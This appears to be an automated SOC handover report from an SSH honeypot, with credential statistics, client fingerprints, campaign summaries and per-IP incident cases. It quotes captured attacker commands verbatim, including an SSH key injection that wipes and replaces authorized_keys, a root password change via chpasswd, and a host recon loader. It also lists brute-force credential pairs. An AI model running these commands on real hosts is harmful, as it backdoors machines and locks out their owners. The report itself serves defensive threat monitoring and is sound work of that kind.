# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-20 |
| **Generated At** | 2026-10-20T16:01:31Z |
| **Shift Time** | 16:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **382** |
| Confirmed Threats | **325** |
| False Positives Filtered | **57** (14.9%) |
| Unique Attacker IPs | **240** |
| Countries of Origin | **43** |
| High Severity Cases | **178** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **204** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1757** |
| Unique Credential Pairs | **981** |
| Unique Usernames | **91** |
| Unique Passwords | **828** |
| Successful Auth Pairs | **1601** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1221 |
| `ubuntu` | 122 |
| `345gs5662d34` | 89 |
| `admin` | 37 |
| `support` | 28 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 89 |
| `3245gs5662d34` | 86 |
| `support` | 28 |
| `` | 20 |
| `123456` | 17 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 89 |
| `root` | `3245gs5662d34` | 38 |
| `support` | `support` | 28 |
| `pi` | `starfish` | 17 |
| `admin` | `admin` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `temp` | `103.211.76.8` | 2026-10-20T00:55:50 |
| `root` | `office` | `10.0.0.73` | 2026-10-20T00:56:32 |
| `support` | `support` | `176.53.159.196` | 2026-10-20T00:56:56 |
| `root` | `office` | `103.211.76.8` | 2026-10-20T00:57:35 |
| `root` | `computer` | `10.0.0.73` | 2026-10-20T00:58:16 |
| `root` | `computer` | `103.211.76.8` | 2026-10-20T00:59:18 |
| `root` | `admin1` | `95.58.255.251` | 2026-10-20T00:59:49 |
| `345gs5662d34` | `345gs5662d34` | `95.58.255.251` | 2026-10-20T00:59:52 |
| `root` | `3245gs5662d34` | `95.58.255.251` | 2026-10-20T00:59:53 |
| `root` | `system` | `10.0.0.73` | 2026-10-20T00:59:59 |
| `ubuntu` | `Zz123456` | `217.60.255.130` | 2026-10-20T01:00:33 |
| `root` | `Huawei123` | `217.60.255.130` | 2026-10-20T01:00:36 |
| `root` | `system` | `103.211.76.8` | 2026-10-20T01:01:01 |
| `root` | `mypc` | `10.0.0.73` | 2026-10-20T01:01:41 |
| `root` | `mypc` | `103.211.76.8` | 2026-10-20T01:02:44 |
| `root` | `pc` | `10.0.0.73` | 2026-10-20T01:03:25 |
| `root` | `pc` | `103.211.76.8` | 2026-10-20T01:04:27 |
| `root` | `ChangeMe1` | `103.63.101.24` | 2026-10-20T01:04:54 |
| `345gs5662d34` | `345gs5662d34` | `103.63.101.24` | 2026-10-20T01:04:58 |
| `root` | `3245gs5662d34` | `103.63.101.24` | 2026-10-20T01:05:00 |
_… 1581 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **382** |
| Sessions with Fingerprint | **32** |
| Unique HASSH Fingerprints | **32** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 133 |
| Go SSH scanner | 46 |
| OpenSSH | 24 |
| PuTTY | 5 |
| AsyncSSH (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 103 | 54 |
| `03a80b21afa8...` | Modern SSH client | 15 | 9 |
| `98ddc5604ef6...` | Modern SSH client | 11 | 3 |
| `419da4c91ddb...` | Modern SSH client | 9 | 1 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 103 | 54 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 21 | 14 | — |
| `03a80b21afa8...` | libssh | 15 | 9 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 11 | 3 | Modern SSH client |
| `419da4c91ddb...` | libssh | 9 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 7 | 4 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 7 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **20** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 110 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 52 | 52 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:LK3IK6gu0bQC"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.67.70`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`, `195.178.110.217`, `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **240** |
| Unique ASNs | **113** |
| High-Risk ASNs | **84** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 53 | HIGH |
| `AS396982` | Google LLC | 11 | HIGH |
| `AS4766` | Korea Telecom | 11 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 8 | HIGH |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (169)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4a739470447a

| Field | Detail |
|---|---|
| **Source IP** | `103.211.76[.]8` |
| **First Seen** | 2026-10-20 00:55 |
| **Last Seen** | 2026-10-20 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:55:49` | `cowrie.session.connect` |
| `2026-10-20 00:55:49` | `cowrie.client.version` |
| `2026-10-20 00:55:50` | `cowrie.client.kex` |
| `2026-10-20 00:55:50` | `cowrie.login.success` |
| `2026-10-20 00:55:51` | `cowrie.session.params` |
| `2026-10-20 00:55:51` | `cowrie.command.input` |
| `2026-10-20 00:55:51` | `cowrie.log.closed` |
| `2026-10-20 00:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.76[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.211.76[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4045749d4148

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-20 00:56 |
| **Last Seen** | 2026-10-20 00:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:56:55` | `cowrie.session.connect` |
| `2026-10-20 00:56:55` | `cowrie.client.version` |
| `2026-10-20 00:56:55` | `cowrie.client.kex` |
| `2026-10-20 00:56:56` | `cowrie.login.success` |
| `2026-10-20 00:56:56` | `cowrie.direct-tcpip.request` |
| `2026-10-20 00:56:56` | `cowrie.direct-tcpip.data` |
| `2026-10-20 00:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5641da9e30ea

| Field | Detail |
|---|---|
| **Source IP** | `95.58.255[.]251` |
| **First Seen** | 2026-10-20 00:59 |
| **Last Seen** | 2026-10-20 00:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:59:48` | `cowrie.session.connect` |
| `2026-10-20 00:59:48` | `cowrie.client.version` |
| `2026-10-20 00:59:48` | `cowrie.client.kex` |
| `2026-10-20 00:59:49` | `cowrie.login.success` |
| `2026-10-20 00:59:50` | `cowrie.session.params` |
| `2026-10-20 00:59:50` | `cowrie.command.input` |
| `2026-10-20 00:59:50` | `cowrie.command.failed` |
| `2026-10-20 00:59:50` | `cowrie.log.closed` |
| `2026-10-20 00:59:51` | `cowrie.session.params` |
| `2026-10-20 00:59:51` | `cowrie.command.input` |
| `2026-10-20 00:59:51` | `cowrie.session.file_download` |
| `2026-10-20 00:59:51` | `cowrie.log.closed` |
| `2026-10-20 00:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.58.255[.]251` to AbuseIPDB if not already reported
- [ ] Block `95.58.255[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659b15b8dba3

| Field | Detail |
|---|---|
| **Source IP** | `95.58.255[.]251` |
| **First Seen** | 2026-10-20 00:59 |
| **Last Seen** | 2026-10-20 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:59:51` | `cowrie.session.connect` |
| `2026-10-20 00:59:51` | `cowrie.client.version` |
| `2026-10-20 00:59:52` | `cowrie.client.kex` |
| `2026-10-20 00:59:52` | `cowrie.login.success` |
| `2026-10-20 00:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.58.255[.]251` to AbuseIPDB if not already reported
- [ ] Block `95.58.255[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf597e56f42b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-10-20 01:00 |
| **Last Seen** | 2026-10-20 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:00:32` | `cowrie.session.connect` |
| `2026-10-20 01:00:32` | `cowrie.client.version` |
| `2026-10-20 01:00:32` | `cowrie.client.kex` |
| `2026-10-20 01:00:33` | `cowrie.login.success` |
| `2026-10-20 01:00:33` | `cowrie.direct-tcpip.request` |
| `2026-10-20 01:00:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-20 01:00:33` | `cowrie.direct-tcpip.data` |
| `2026-10-20 01:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-444328e4c6db

| Field | Detail |
|---|---|
| **Source IP** | `103.63.101[.]24` |
| **First Seen** | 2026-10-20 01:04 |
| **Last Seen** | 2026-10-20 01:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:04:53` | `cowrie.session.connect` |
| `2026-10-20 01:04:53` | `cowrie.client.version` |
| `2026-10-20 01:04:53` | `cowrie.client.kex` |
| `2026-10-20 01:04:54` | `cowrie.login.success` |
| `2026-10-20 01:04:55` | `cowrie.session.params` |
| `2026-10-20 01:04:55` | `cowrie.command.input` |
| `2026-10-20 01:04:55` | `cowrie.command.failed` |
| `2026-10-20 01:04:55` | `cowrie.log.closed` |
| `2026-10-20 01:04:56` | `cowrie.session.params` |
| `2026-10-20 01:04:56` | `cowrie.command.input` |
| `2026-10-20 01:04:57` | `cowrie.session.file_download` |
| `2026-10-20 01:04:57` | `cowrie.log.closed` |
| `2026-10-20 01:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.101[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.63.101[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0d3c948201

| Field | Detail |
|---|---|
| **Source IP** | `103.63.101[.]24` |
| **First Seen** | 2026-10-20 01:04 |
| **Last Seen** | 2026-10-20 01:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:04:57` | `cowrie.session.connect` |
| `2026-10-20 01:04:57` | `cowrie.client.version` |
| `2026-10-20 01:04:57` | `cowrie.client.kex` |
| `2026-10-20 01:04:58` | `cowrie.login.success` |
| `2026-10-20 01:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.101[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.63.101[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5abc44458d30

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:21` | `cowrie.session.connect` |
| `2026-10-20 01:50:21` | `cowrie.client.version` |
| `2026-10-20 01:50:21` | `cowrie.client.kex` |
| `2026-10-20 01:50:21` | `cowrie.login.success` |
| `2026-10-20 01:50:21` | `cowrie.session.params` |
| `2026-10-20 01:50:21` | `cowrie.command.input` |
| `2026-10-20 01:50:21` | `cowrie.command.failed` |
| `2026-10-20 01:50:22` | `cowrie.log.closed` |
| `2026-10-20 01:50:22` | `cowrie.session.params` |
| `2026-10-20 01:50:22` | `cowrie.command.input` |
| `2026-10-20 01:50:22` | `cowrie.session.file_download` |
| `2026-10-20 01:50:22` | `cowrie.log.closed` |
| `2026-10-20 01:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b835a397d7f5

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:22` | `cowrie.session.connect` |
| `2026-10-20 01:50:22` | `cowrie.client.version` |
| `2026-10-20 01:50:22` | `cowrie.client.kex` |
| `2026-10-20 01:50:22` | `cowrie.login.success` |
| `2026-10-20 01:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a93c54bbad

| Field | Detail |
|---|---|
| **Source IP** | `122.114.69[.]235` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:39` | `cowrie.session.connect` |
| `2026-10-20 01:50:39` | `cowrie.client.version` |
| `2026-10-20 01:50:39` | `cowrie.client.kex` |
| `2026-10-20 01:50:40` | `cowrie.login.success` |
| `2026-10-20 01:50:41` | `cowrie.session.params` |
| `2026-10-20 01:50:41` | `cowrie.command.input` |
| `2026-10-20 01:50:41` | `cowrie.command.failed` |
| `2026-10-20 01:50:41` | `cowrie.log.closed` |
| `2026-10-20 01:50:43` | `cowrie.session.params` |
| `2026-10-20 01:50:43` | `cowrie.command.input` |
| `2026-10-20 01:50:43` | `cowrie.session.file_download` |
| `2026-10-20 01:50:43` | `cowrie.log.closed` |
| `2026-10-20 01:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.114.69[.]235` to AbuseIPDB if not already reported
- [ ] Block `122.114.69[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa98b325771b

| Field | Detail |
|---|---|
| **Source IP** | `122.114.69[.]235` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:43` | `cowrie.session.connect` |
| `2026-10-20 01:50:43` | `cowrie.client.version` |
| `2026-10-20 01:50:43` | `cowrie.client.kex` |
| `2026-10-20 01:50:45` | `cowrie.login.success` |
| `2026-10-20 01:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.114.69[.]235` to AbuseIPDB if not already reported
- [ ] Block `122.114.69[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-330937e88d99

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]13` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:46` | `cowrie.session.connect` |
| `2026-10-20 01:50:46` | `cowrie.client.version` |
| `2026-10-20 01:50:46` | `cowrie.client.kex` |
| `2026-10-20 01:50:46` | `cowrie.login.success` |
| `2026-10-20 01:50:46` | `cowrie.session.params` |
| `2026-10-20 01:50:46` | `cowrie.command.input` |
| `2026-10-20 01:50:46` | `cowrie.command.failed` |
| `2026-10-20 01:50:47` | `cowrie.log.closed` |
| `2026-10-20 01:50:47` | `cowrie.session.params` |
| `2026-10-20 01:50:47` | `cowrie.command.input` |
| `2026-10-20 01:50:47` | `cowrie.session.file_download` |
| `2026-10-20 01:50:47` | `cowrie.log.closed` |
| `2026-10-20 01:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]13` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49931fcc112c

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]13` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:47` | `cowrie.session.connect` |
| `2026-10-20 01:50:47` | `cowrie.client.version` |
| `2026-10-20 01:50:48` | `cowrie.client.kex` |
| `2026-10-20 01:50:48` | `cowrie.login.success` |
| `2026-10-20 01:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]13` to AbuseIPDB if not already reported
